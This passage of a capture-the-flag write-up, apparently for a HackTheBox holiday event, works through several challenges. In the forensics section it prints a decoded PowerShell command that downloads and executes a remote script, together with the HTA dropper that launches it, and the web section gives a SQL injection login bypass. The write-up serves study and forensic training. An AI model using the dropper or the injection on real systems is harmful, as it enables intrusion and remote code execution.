{sa_family=AF_INET, sin_port=htons(32124), sin_addr=inet_addr("178.128.46.48")}, 16) = 0\nrecvfrom(3, "X\\16\\201\\226vg\\33\\374\\304\\0\\212\\2,\\36\\371\\344\\341{i\\236\\t\\247B\\324\\30\\20a\\37I\\301\\332\\34", 32, 0, NULL, NULL) = 32\nsendto(3, "\\34\\332\\301I\\37a\\20\\30\\324B\\247\\t\\236i{\\341\\344\\371\\36,\\2\\212\\0\\304\\374\\33gv\\226\\201\\16X", 32, 0, NULL, 0) = 32\nrecvfrom(3, "`:\\326\\364\\0\\261+C\\252O\\310\\315y\\270;\\221\\274!\\r\\344\\200h\\361\\334L\\20(\\10\\271\\336Q\\305", 32, 0, NULL, NULL) = 32\nsendto(3, "|\\340\\27\\275\\37\\320;[~\\ro\\304\\347\\321@pX\\330\\23\\310\\202\\342\\361\\30\\260\\vO~/__\\235", 32, 0, NULL, 0) = 32\nrecvfrom(3, "\\0", 1, 0, NULL, NULL)     = 1\nrecvfrom(3, "HTB{n0t_qu1t3_s0_0p4qu3}", 1024, 0, NULL, NULL) = 24\nnewfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x5), ...}, AT_EMPTY_PATH) = 0\nbrk(NULL)                               = 0x5621147dd000\nbrk(0x5621147fe000)                     = 0x5621147fe000\nwrite(1, "[!] Untrusted Client Location - "..., 53[!] Untrusted Client Location - Enabling Opaque Mode\n) = 53\nexit_group(0)                           = ?\n+++ exited with 0 +++\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"HTB{n0t_qu1t3_s0_0p4qu3}")),(0,r.kt)("h2",{id:"day-2---02122021"},"Day 2 - 02/12/2021"),(0,r.kt)("h3",{id:"toy-management---web"},"Toy Management - Web"),(0,r.kt)("p",null,"While unauthenticated we can only access a authentication form.\nWe'll have to analyse the source code to identify an entry point."),(0,r.kt)("h4",{id:"source-code-analysis-1"},"Source code analysis"),(0,r.kt)("p",null,"In ",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/database.sql")," we can understand the database structure and where\nwe'll have to look to find the flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"CREATE TABLE `toylist` (\n  `id` int NOT NULL,\n  `toy` varchar(256) NOT NULL,\n  `receiver` varchar(256) NOT NULL,\n  `location` varchar(256) NOT NULL,\n  `approved` int NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\nINSERT INTO `toylist` (`id`, `toy`, `receiver`, `location`, `approved`) VALUES\n(1,  'She-Ra, Princess of Power', 'Elaina Love', 'Houston', 1),\n(2, 'Bayblade Burst Evolution', 'Jarrett Pace', 'Dallas', 1),\n(3, 'Barbie Dreamhouse Playset', 'Kristin Vang', 'Austin', 1),\n(4, 'StarWars Action Figures', 'Jaslyn Huerta', 'Amarillo', 1),\n(5, 'Hot Wheels: Volkswagen Beach Bomb', 'Eric Cameron', 'San Antonio', 1),\n(6, 'Polly Pocket dolls', 'Aracely Monroe', 'El Paso', 1),\n(7, 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'HTBer', 'HTBland', 0);\n\nCREATE TABLE `users` (\n  `id` int NOT NULL,\n  `username` varchar(256) NOT NULL,\n  `password` varchar(256) NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n\nINSERT INTO `users` (`id`, `username`, `password`) VALUES\n(1, 'manager', '69bbdcd1f9feab7842f3a1c152062407'),\n(2, 'admin', '592c094d5574fb32fe9d4cce27240588');\n")),(0,r.kt)("p",null,"Let's look how the queries to the database are crafted in ",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/database.js"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"  async listToys(approved=1) {\n    return new Promise(async (resolve, reject) => {\n      let stmt = `SELECT * FROM toylist WHERE approved = ?`;\n      this.connection.query(stmt, [approved], (err, result) => {\n        if(err)\n          reject(err)\n        try {\n          resolve(JSON.parse(JSON.stringify(result)))\n        }\n        catch (e) {\n          reject(e)\n        }\n      })\n\n    });\n  }\n\n  async loginUser(user, pass) {\n    return new Promise(async (resolve, reject) => {\n      let stmt = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;\n      this.connection.query(stmt, (err, result) => {\n        if(err)\n          reject(err)\n        try {\n          resolve(JSON.parse(JSON.stringify(result)))\n        }\n        catch (e) {\n          reject(e)\n        }\n      })\n    });\n  }\n\n  async getUser(user) {\n    return new Promise(async (resolve, reject) => {\n      let stmt = `SELECT * FROM users WHERE username = '${user}'`;\n      this.connection.query(stmt, (err, result) => {\n        if(err)\n          reject(err)\n        try {\n          resolve(JSON.parse(JSON.stringify(result)))\n        }\n        catch (e) {\n          reject(e)\n        }\n      })\n    });\n  }\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"listToys()")," will list the toys but only the approved ones and the flag is the\nonly one that is not approved. ",(0,r.kt)("inlineCode",{parentName:"p"},"loginUser()")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"getUser()")," are unsafe because\nthey are conncatenating user input directly to the query so we'll be able to\nperform a SQL injection."),(0,r.kt)("p",null,"But by reading the routes in ",(0,r.kt)("inlineCode",{parentName:"p"},"challenge/routes/index.js"),", we can see that if\nwe are connected as admin, ",(0,r.kt)("inlineCode",{parentName:"p"},"listToys()")," argument ",(0,r.kt)("inlineCode",{parentName:"p"},"approved")," will be overriden\nwith ",(0,r.kt)("inlineCode",{parentName:"p"},"0")," value so it will list unapproved toys including the flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-javascript"},"router.get('/api/toylist', AuthMiddleware, async (req, res) => {\n  return db.getUser(req.data.username)\n    .then(user => {\n      approved = 1;\n      if (user[0].username == 'admin') approved = 0;\n      return db.listToys(approved)\n        .then(toyInfo => {\n          return res.json(toyInfo);\n        })\n        .catch(() => res.status(500).send(response('Something went wrong!')));\n    })\n    .catch(() => res.status(500).send(response('Something went wrong!')));\n});\n")),(0,r.kt)("h4",{id:"exploitation-sql-injection"},"Exploitation: SQL injection"),(0,r.kt)("p",null,"Since the login request is vulnerable to SQLi, we are able to log in as\nadmin just by using the following credentials:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"admin'-- -")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"anything"))),(0,r.kt)("p",null,"forming this queries:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT username FROM users WHERE username = 'admin'-- -' and password = 'anything'\n")),(0,r.kt)("p",null,"We can grab the flag from the dashboard: ",(0,r.kt)("inlineCode",{parentName:"p"},"HTB{1nj3cti0n_1s_in3v1t4bl3}")),(0,r.kt)("h3",{id:"xmas-spirit---crypto"},"XMAS Spirit - Crypto"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/python3\n\nimport random\nfrom math import gcd\n\ndef encrypt(dt):\n  mod = 256\n  while True:\n    a = random.randint(1,mod)\n    if gcd(a, mod) == 1: break\n  b = random.randint(1,mod)\n\n  res = b''\n  for byte in dt:\n    enc = (a*byte + b) % mod\n    res += bytes([enc])\n  return res\n\ndt = open('letter.pdf', 'rb').read()\n\nres = encrypt(dt)\n\nf = open('encrypted.bin', 'wb')\nf.write(res)\nf.close()\n")),(0,r.kt)("p",null,"We know that the source file is a PDF. There are very few combinations possible\n(",(0,r.kt)("inlineCode",{parentName:"p"},"255*255")," maximum, or ",(0,r.kt)("inlineCode",{parentName:"p"},"255*128")," keeping only the values when ",(0,r.kt)("inlineCode",{parentName:"p"},"a")," is coprime with the modulus)."),(0,r.kt)("p",null,"So what we can do is take the magic bytes (signature) of a PDF (5 bytes) and\nbrute-force all values of ",(0,r.kt)("inlineCode",{parentName:"p"},"a")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"b")," until we end back on the sames bytes as\nthe encrypted document."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"require 'ctf_party' # https://github.com/cyfun/ctf-party\n\nencdata = File.read('letter.pdf.encrypted.bin')\n\nencheader = encdata[0...5].to_hex.scan(/.{1,2}/)\nsignature = ['25','50','44','46','2D'] # '%PDF-'\n\n(1..255).each do |i|\n  (1..255).each do |j|\n    res = []\n    signature.each do |byte|\n      clear = ((byte.hex2dec.to_i*i)+j) % 256\n      res << clear.chr.to_hex if (1..255).include?(clear)\n    end\n    puts \"a=#{i}, b=#{j}\" if res == encheader\n  end\nend\n")),(0,r.kt)("p",null,"Doing so I retrieved the value of a and b used to encrypt the file:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ruby bf.rb\na=169, b=160\n")),(0,r.kt)("p",null,"But after that I was unable to decrypt the file."),(0,r.kt)("h3",{id:"honeypot---forensics"},"Honeypot - Forensics"),(0,r.kt)("p",null,"Let's see with Volatility3 if there are suspicious commands."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ vol -f honeypot.raw windows.cmdline\n...\n2700    powershell.exe  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==\n...\n')),(0,r.kt)("p",null,"Let's decode the base64 encoded powershell payload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ printf %s 'aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==' | base64 -d\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))\n")),(0,r.kt)("p",null,"So here we have the full URL of the malware and the PID of the powershell (2700)."),(0,r.kt)("p",null,"Let's list processes to see it's parents and childs."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ vol -f honeypot.raw windows.pslist | grep 2700\n2700    3720    powershell.exe  0x8420dd28      13      444     2       False   2021-11-25 19:13:50.000000      N/A     Disabled\n4028    2700    whoami.exe      0x85d8db00      0       -       2       False   2021-11-25 19:14:01.000000      2021-11-25 19:14:01.000000      Disabled\n4036    2700    HOSTNAME.EXE    0x84289030      0       -       2       False   2021-11-25 19:14:01.000000      2021-11-25 19:14:01.000000      Disabled\n")),(0,r.kt)("p",null,"The parent 3720 doesn't not exists, so let's see the childs 4028 and 4036."),(0,r.kt)("p",null,"We know the downloaded powershell script is about ",(0,r.kt)("em",{parentName:"p"},"update")," so let's find a\nfile related to update."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ vol -f honeypot.raw windows.filescan | grep update\n0x3e7c4c50 100.0\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Media Center\\mcupdate 128\n0x3ee413b0      \\Windows\\System32\\mcupdate_AuthenticAMD.dll     128\n0x3f4d4348      \\Users\\Santa\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\M3FMRSOD\\christmas_update[1].hta      128\n")),(0,r.kt)("p",null,"The last file looks interesting, let's download it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ vol -f honeypot.raw windows.dumpfiles --physaddr 0x3f4d4348\nVolatility 3 Framework 1.0.1\nProgress:  100.00               PDB scanning finished\nCache   FileObject      FileName        Result\n\nDataSectionObject       0x3f4d4348      christmas_update[1].hta file.0x3f4d4348.0x84ac5568.DataSectionObject.christmas_update[1].hta.dat\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<html>\n<head>\n<HTA:APPLICATION id="Microsoft" applicationName="Christmas update"/>\n<script>\nvar sh = new ActiveXObject("WScript.Shell");\nsh.run(\'powershell.exe /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==\');\nwindow.close();\n<\/script>\n</html>\n')),(0,r.kt)("p",null,"So it seems the powershell backdoor was launched by a malicious website with\nActiveX. So the parent process 3720 was likely a web browser."),(0,r.kt)("p",null,"If we look at network connections we can see there are no foreign addresses\nassociated with ",(0,r.kt)("inlineCode",{parentName:"p"},"powershell.exe")," process or its childs."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ vol -f honeypot.raw windows.netscan\nVolatility 3 Framework 1.0.1\nProgress:  100.00               PDB scanning finished\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n\n0x23d04218      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       400     services.exe    N/A\n0x23d04218      TCPv6   ::      49155   ::      0       LISTENING       400     services.exe    N/A\n0x2554b460      TCPv4   10.0.2.15       49226   93.184.220.29   80      ESTABLISHED     -       -       -\n0x261e9d30      TCPv4   10.0.2.15       49228   172.67.177.22   443     ESTABLISHED     -       -       -\n0x3e22f008      UDPv4   0.0.0.0 0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000\n0x3e22f008      UDPv6   ::      0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000\n0x3e238300      TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  N/A\n0x3e238300      TCPv6   ::      445     ::      0       LISTENING       4       System  N/A\n0x3e24c588      UDPv4   0.0.0.0 0       *       0               2080    svchost.exe     2021-11-25 19:12:23.000000\n0x3e281368      UDPv4   10.0.2.15       138     *       0               4       System  2021-11-25 19:12:23.000000\n0x3e2a29b8      UDPv4   0.0.0.0 0       *       0               1084    svchost.exe     2021-11-25 19:12:23.000000\n0x3e2a29b8      UDPv6   ::      0       *       0               1084    svchost.exe     2021-11-25 19:12:23.000000\n0x3e2a6448      UDPv4   0.0.0.0 5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000\n0x3e2b5b88      TCPv4   10.0.2.15       139     0.0.0.0 0       LISTENING       4       System  N/A\n0x3e2e9cc0      TCPv4   10.0.2.15       49221   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3e354618      UDPv6   fe80::256b:4013:4140:453f       546     *       0               744     svchost.exe     2021-11-25 19:12:31.000000\n0x3e3b0c70      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3e5e4f50      UDPv4   0.0.0.0 5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000\n0x3e5e4f50      UDPv6   ::      5355    *       0               1084    svchost.exe     2021-11-25 19:12:26.000000\n0x3e5f77a0      TCPv4   0.0.0.0 22      0.0.0.0 0       LISTENING       1676    sshd.exe        N/A\n0x3e619578      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       348     wininit.exe     N/A\n0x3e619578      TCPv6   ::      49152   ::      0       LISTENING       348     wininit.exe     N/A\n0x3e619cc0      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       348     wininit.exe     N/A\n0x3e630008      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3e630008      UDPv6   ::      0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3e630a20      TCPv4   0.0.0.0 49156   0.0.0.0 0       LISTENING       408     lsass.exe       N/A\n0x3e630a20      TCPv6   ::      49156   ::      0       LISTENING       408     lsass.exe       N/A\n0x3e648508      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       744     svchost.exe     N/A\n0x3e648508      TCPv6   ::      49153   ::      0       LISTENING       744     svchost.exe     N/A\n0x3e6b92c0      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       692     svchost.exe     N/A\n0x3e6b92c0      TCPv6   ::      135     ::      0       LISTENING       692     svchost.exe     N/A\n0x3e6b9910      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       692     svchost.exe     N/A\n0x3e6f0bd8      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       744     svchost.exe     N/A\n0x3e75f8e0      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       888     svchost.exe     N/A\n0x3e762a40      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       400     services.exe    N/A\n0x3e7686e8      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       888     svchost.exe     N/A\n0x3e7686e8      TCPv6   ::      49154   ::      0       LISTENING       888     svchost.exe     N/A\n0x3e8611f0      TCPv4   0.0.0.0 22      0.0.0.0 0       LISTENING       1676    sshd.exe        N/A\n0x3e8611f0      TCPv6   ::      22      ::      0       LISTENING       1676    sshd.exe        N/A\n0x3e9be828      TCPv4   0.0.0.0 49156   0.0.0.0 0       LISTENING       408     lsass.exe       N/A\n0x3ed036c8      UDPv4   10.0.2.15       137     *       0               4       System  2021-11-25 19:12:23.000000\n0x3ee98d80      TCPv4   10.0.2.15       49229   147.182.172.189 4444    ESTABLISHED     -       -       -\n0x3f1b0df8      TCPv4   10.0.2.15       49216   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3f225df8      TCPv4   10.0.2.15       49222   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3f2cff50      UDPv4   0.0.0.0 0       *       0               -       -       2021-11-25 19:13:04.000000\n0x3f2cff50      UDPv6   ::      0       *       0               -       -       2021-11-25 19:13:04.000000\n0x3f4d7378      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3f4dad28      UDPv4   127.0.0.1       58426   *       0               3344    iexplore.exe    2021-11-25 19:13:31.000000\n0x3f520ab8      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3f520ab8      UDPv6   ::      0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000\n0x3f546de8      UDPv4   0.0.0.0 0       *       0               636     VBoxService.ex  2021-11-25 19:14:14.000000\n0x3f547008      TCPv4   10.0.2.15       49220   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3f561438      TCPv4   10.0.2.15       49215   204.79.197.203  443     ESTABLISHED     -       -       -\n0x3f57c438      TCPv4   10.0.2.15       49218   95.100.210.141  443     ESTABLISHED     -       -       -\n0x3f58b4c8      TCPv4   10.0.2.15       49217   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3f58c748      TCPv4   10.0.2.15       49223   212.205.126.106 443     ESTABLISHED     -       -       -\n0x3f58e9d8      TCPv4   10.0.2.15       49225   172.67.177.22   443     ESTABLISHED     -       -       -\n0x3f5c6df8      TCPv4   10.0.2.15       49219   95.100.210.141  443     ESTABLISHED     -       -       -\n")),(0,r.kt)("p",null,"However the IP address ",(0,r.kt)("inlineCode",{parentName:"p"},"147.182.172.189")," is connecting to port 4444 which is used\nby default for metasploti reverse shells."),(0,r.kt)("p",null,"Also if we resolve the domain of the malicious URL we can see there are\nconnections to ",(0,r.kt)("inlineCode",{parentName:"p"},"172.67.177.22")," which is normal since the powershell script was\ndownloaded from there."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ drill windowsliveupdater.com\n;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 33774\n;; flags: qr rd ra ; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0\n;; QUESTION SECTION:\n;; windowsliveupdater.com.      IN      A\n\n;; ANSWER SECTION:\nwindowsliveupdater.com. 300     IN      A       104.21.96.108\nwindowsliveupdater.com. 300     IN      A       172.67.177.22\n\n;; AUTHORITY SECTION:\n\n;; ADDITIONAL SECTION:\n\n;; Query time: 34 msec\n;; SERVER: 64.6.64.6\n;; WHEN: Fri Dec  3 00:12:20 2021\n;; MSG SIZE  rcvd: 72\n")),(0,r.kt)("p",null,"The expected flag format is the following:"),(0,r.kt)("blockquote",null,(0,r.kt)("ol",{parentName:"blockquote"},(0,r.kt)("li",{parentName:"ol"},"Find the full URL used to download the malware."),(0,r.kt)("li",{parentName:"ol"},"Find the malicious's process ID."),(0,r.kt)("li",{parentName:"ol"},"Find the attackers IP")),(0,r.kt)("p",{parentName:"blockquote"},'Flag Format: HTB{echo -n "',(0,r.kt)("a",{parentName:"p",href:"http://url.com/path.foo_PID_127.0.0.1%22"},'http://url.com/path.foo_PID_127.0.0.1"')," | md5sum}")),(0,r.kt)("p",null,"So wrapping up all we got so far, I expected the flag to be the md5 hash of\none of the first two payload below but it's not, so I tested also a bunch of other."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"https://windowsliveupdater.com/update.ps1_2700_172.67.177.22\nhttps://windowsliveupdater.com/update.ps1_2700_147.182.172.189\n\nhttps://windowsliveupdater.com/update.ps1_2700_93.184.220.29\nhttps://windowsliveupdater.com/update.ps1_2700_212.205.126.106\nhttps://windowsliveupdater.com/update.ps1_2700_204.79.197.203\nhttps://windowsliveupdater.com/update.ps1_2700_95.100.210.141\nhttps://windowsliveupdater.com/update.ps1_2700_104.21.96.108\nhttps://windowsliveupdater.com/update.ps1_4036_147.182.172.189\nhttps://windowsliveupdater.com/update.ps1_4028_147.182.172.189\nhttps://windowsliveupdater.com/update.ps1_3720_147.182.172.189\n")),(0,r.kt)("p",null,"In the end I didn't managed to get the flag."),(0,r.kt)("h3",{id:"gift-wrapping---reversing"},"Gift Wrapping - Reversing"),(0,r.kt)("p",null,"A quick ",(0,r.kt)("inlineCode",{parentName:"p"},"strings")," on the binaries shows it is packed with UPX."),(0,r.kt)("p",null,"So let's unpack it: ",(0,r.kt)("inlineCode",{parentName:"p"},"upx -d rev_giftwrap/giftwrap"),"."),(0,r.kt)("p",null,"Then reverse with radare2/rizin or ioita/cutter."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ r2 rev_giftwrap/giftwrap\n[0x00401700]> aaa\n[0x00401700]> pdf@main\n")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/dNJjxcm.png",alt:null})),(0,r.kt)("p",null,"The macro view is that we are asked an input, this input is xored with ",(0,r.kt)("inlineCode",{parentName:"p"},"0xf3"),", then an obfuscated function (",(0,r.kt)("inlineCode",{parentName:"p"},"fcn.00401080"),") is called with 3 arguments: ",(0,r.kt)("inlineCode",{parentName:"p"},"0x17"),", our xored input and and object called ",(0,r.kt)("inlineCode",{parentName:"p"},"CHECK")," that is likely the xored right value of the flag, then there is a comparison to check if the transformed input match the flag and print a message accordingly."),(0,r.kt)("p",null,"It's a bit clearer when displayed as a conditional graph."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/e9icJZc.png",alt:null})),(0,r.kt)("p",null,"Checking the decompiled code with the ghidra plugin also allow to understand the behavior."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/KuBgrrL.png",alt:null})),(0,r.kt)("p",null,"Now there two ways to solve this challenge and retrieve the flag."),(0,r.kt)("h4",{id:"naive-approach"},"Naive approach"),(0,r.kt)("p",null,"The quick and easy way is to display the ",(0,r.kt)("inlineCode",{parentName:"p"},"CHECK")," value while statically analysing the binary and xor it back with ",(0,r.kt)("inlineCode",{parentName:"p"},"0xf3"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x00401a0b]> psz @obj.CHECK\n\\xbb\\xa7\\xb1\\x88\\x86\\x83\\x8b\\xac\\xc7\\xc2\\x9d\\x87\\xac\\xc6\\xc3\\xac\\x9b\\xc7\\x81\\x97\\xd2\\xd2\\x8e\n[0x00401700]> px0 @obj.CHECK\nbba7b18886838bacc7c29d87acc6c3ac9bc78197d2d28e\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ xortool-xor -h bba7b18886838bacc7c29d87acc6c3ac9bc78197d2d28e -h f3\nHTB{upx_41nt_50_h4rd!!}\n")),(0,r.kt)("h4",{id:"elegant-approach"},"Elegant approach"),(0,r.kt)("p",null,"The more difficult but elegant solution is to dynamically debug and\ninteract with the binary."),(0,r.kt)("p",null,"First we launch the binary in debug mode and set two breakpoints:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"0x004019b1"),": one after the ",(0,r.kt)("inlineCode",{parentName:"li"},"scanf()")," to be able to overwrite the stack and repalce the placeholder input with the xord flag."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"0x00401a0b"),": one before the comparision (before ",(0,r.kt)("em",{parentName:"li"},"Welcome inside...")," or ",(0,r.kt)("em",{parentName:"li"},"Wrong password! Who are you?!?")," is displayed and the program quits) to be able to inspect the value of the plaintext flag.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ r2 -d rev_giftwrap/giftwrap\n[0x00401700]> aaa\n[0x00401700]> pdf@main\n[0x00401700]> db 0x004019b1\n[0x00401700]> db 0x00401a0b\n")),(0,r.kt)("p",null,"Then we start the program and input a placeholder value that has the same size (23 bytes) as the flag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x00401700]> dc\nWhat's the magic word? AAAAAAAAAAAAAAAAAAAAAAA\nhit breakpoint at: 0x401a0b\n")),(0,r.kt)("p",null,"Note: to find the size of the flag we just have read ",(0,r.kt)("inlineCode",{parentName:"p"},"obj.CHECK"),", here I\nsubstract one to remove the size of the string terminator (",(0,r.kt)("inlineCode",{parentName:"p"},"0x00"),") and\ndivide by two because it is printed in hexadecimal."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x00401700]> px0 @obj.CHECK | ruby -e 'puts (STDIN.read.size - 1)/2'\n23\n")),(0,r.kt)("p",null,"The we display the stack (",(0,r.kt)("inlineCode",{parentName:"p"},"rsp"),") and see that it contains the 23 ",(0,r.kt)("em",{parentName:"p"},"A"),"\nplaceholder after an offset of 16 bytes (",(0,r.kt)("inlineCode",{parentName:"p"},"0x10"),")."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x004019de]> pxr@rsp\n0x7ffcf8190b90 ..[ null bytes ]..   00000000 rsp\n0x7ffcf8190b98 0x00000000f8190c20    ....... 4162391072\n0x7ffcf8190ba0 0x4141414141414141   AAAAAAAA ascii ('A')\n0x7ffcf8190ba8 0x4141414141414141   AAAAAAAA ascii ('A')\n0x7ffcf8190bb0 0x0041414141414141   AAAAAAA. ascii ('A')\n0x7ffcf8190bb8 ..[ null bytes ]..   00000000\n")),(0,r.kt)("p",null,"So let's rewrite the stack and replace the placeholder by the xored flag:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x004019de]> w $(psz @obj.CHECK) @ rsp+0x10\n[0x004019de]> pxr@rsp\n0x7ffd17ee5e10 ..[ null bytes ]..   00000000 rsp\n0x7ffd17ee5e18 0x0000000017ee5ea0   .^...... 401497760\n0x7ffd17ee5e20 0xac8b838688b1a7bb   ........\n0x7ffd17ee5e28 0xacc3c6ac879dc2c7   ........\n0x7ffd17ee5e30 0x008ed2d29781c79b   ........\n0x7ffd17ee5e38 ..[ null bytes ]..   00000000\n")),(0,r.kt)("p",null,"The ",(0,r.kt)("inlineCode",{parentName:"p"},"CHECK")," object seems read the flag from ",(0,r.kt)("inlineCode",{parentName:"p"},"rsi"),"."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/t3IdPdH.png",alt:null})),(0,r.kt)("p",null,"So we just have to read the value of ",(0,r.kt)("inlineCode",{parentName:"p"},"rsi")," after the check before\nthe comparison and jump."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[0x004019b1]> dc\nhit breakpoint at: 0x401a0b\n[0x00401a0b]> dr rsi\n0x7fffc8f8db90\n[0x00401a0b]> psz 